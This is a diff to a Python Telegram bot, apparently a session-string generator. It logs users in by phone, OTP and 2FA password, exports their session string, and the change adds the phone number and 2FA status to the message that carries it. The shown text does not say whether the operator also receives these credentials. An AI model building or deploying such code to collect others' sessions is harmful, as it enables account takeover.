@@ -17,17 +17,20 @@ from pyrogram.errors import (
 # ─────────────────── LOAD ENV ───────────────────
 load_dotenv()
 
+
 def _get_int(key: str) -> int:
     val = os.getenv(key)
     if not val:
         raise RuntimeError(f"❌ Missing env var: {key}")
     return int(val)
 
+
 def _get_str(key: str) -> str:
     val = os.getenv(key)
     if not val:
         raise RuntimeError(f"❌ Missing env var: {key}")
     return val.strip()
+
 
 API_ID    = _get_int("API_ID")
 API_HASH  = _get_str("API_HASH")
@@ -42,7 +45,7 @@ bot = Client(
     bot_token=BOT_TOKEN,
 )
 
-# user_id -> {client, phone, phone_code_hash, otp, stage}
+# user_id -> {client, phone, phone_code_hash, otp, stage, has_2fa}
 sessions: dict[int, dict] = {}
 
 
@@ -88,7 +91,15 @@ async def safe_edit_or_reply(message: Message, text: str, edit: bool, **kwargs):
         print(f"[reply fail] {e}")
 
 
-async def finish_login(message: Message, user_id: int, temp: Client, edit: bool):
+async def finish_login(
+    message: Message,
+    user_id: int,
+    temp: Client,
+    edit: bool,
+    has_2fa: bool = False,
+    phone: str = "—",
+):
+    # Export session + get_me
     try:
         session_string = await temp.export_session_string()
         me = await temp.get_me()
@@ -100,6 +111,7 @@ async def finish_login(message: Message, user_id: int, temp: Client, edit: bool)
     user_mention = f"[{me.first_name}](tg://user?id={me.id})"
     username_line = f"@{me.username}" if me.username else "—"
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
+    twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
     # ── 1) User ko DM ──
     user_txt = (
@@ -117,7 +129,9 @@ async def finish_login(message: Message, user_id: int, temp: Client, edit: bool)
             f"👤 User: {user_mention}\n"
             f"🆔 ID: `{me.id}`\n"
             f"📛 Name: {full_name}\n"
-            f"🔗 Username: {username_line}\n\n"
+            f"🔗 Username: {username_line}\n"
+            f"📱 Phone: `{phone}`\n"
+            f"🔐 2FA: {twofa_line}\n\n"
             "**String Session:**\n\n"
             f"`{session_string}`"
         )
@@ -194,6 +208,7 @@ async def contact_handler(client: Client, message: Message):
         "phone_code_hash": sent_code.phone_code_hash,
         "otp": "",
         "stage": "otp",
+        "has_2fa": False,
     }
 
     markup, text = keypad_markup("")
@@ -243,6 +258,7 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
     except SessionPasswordNeeded:
         sess["stage"] = "password"
         sess["otp"] = ""
+        sess["has_2fa"] = True
         try:
             await cb.message.edit_text(
                 "🔐 **2FA enabled hai.**\n\n"
@@ -278,7 +294,14 @@ async def do_sign_in(cb: CallbackQuery, sess: dict, otp: str):
         await cleanup_user(user_id)
         return
 
-    await finish_login(cb.message, user_id, temp, edit=True)
+    await finish_login(
+        cb.message,
+        user_id,
+        temp,
+        edit=True,
+        has_2fa=sess.get("has_2fa", False),
+        phone=sess.get("phone", "—"),
+    )
 
 
 # ─────────────────── TEXT HANDLER ───────────────────
@@ -308,7 +331,14 @@ async def text_handler(client: Client, message: Message):
             return await message.reply("❌ Galat password. Dobara try karo.")
         except Exception as e:
             return await message.reply(f"❌ Error: `{e}`")
-        await finish_login(message, user_id, sess["client"], edit=False)
+        await finish_login(
+            message,
+            user_id,
+            sess["client"],
+            edit=False,
+            has_2fa=sess.get("has_2fa", False),
+            phone=sess.get("phone", "—"),
+        )
 
 
 # ─────────────────── OTHER MESSAGES ───────────────────
